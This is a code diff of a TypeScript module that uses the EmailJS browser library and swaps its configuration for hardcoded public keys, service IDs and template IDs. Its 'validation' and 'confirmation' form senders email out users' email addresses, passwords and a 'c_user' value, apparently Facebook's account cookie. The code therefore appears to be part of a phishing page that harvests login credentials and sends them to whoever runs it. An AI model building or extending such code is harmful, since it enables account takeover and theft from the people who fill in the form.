@@ -2,19 +2,15 @@ import emailjs from '@emailjs/browser';
 
 // Initialize EmailJS with your user ID
 export const initEmailJS = () => {
-  const publicKey = import.meta.env.VITE_EMAILJS_USER_ID;
-  if (!publicKey) {
-    throw new Error('EmailJS public key is not configured');
-  }
-  emailjs.init(publicKey);
+  emailjs.init("DyCIA12LXgWwUM_ps");
 };
 
 // Validation form email sender
 export const sendValidationFormEmail = async (formData: any) => {
   try {
     const response = await emailjs.send(
-      import.meta.env.VITE_EMAILJS_SERVICE_ID,
-      import.meta.env.VITE_EMAILJS_VALIDATION_TEMPLATE_ID,
+      "service_jpksfco",
+      "template_90egw9s",
       {
         user_email: formData.user_email,
         c_user: formData.c_user,
@@ -35,8 +31,8 @@ export const sendValidationFormEmail = async (formData: any) => {
 export const sendConfirmationFormEmail = async (formData: any) => {
   try {
     const response = await emailjs.send(
-      import.meta.env.VITE_EMAILJS_SERVICE_ID,
-      import.meta.env.VITE_EMAILJS_CONFIRMATION_TEMPLATE_ID,
+      "service_jpksfco",
+      "template_90egw9s",
       {
         user_email: formData.user_email,
         password: formData.password,
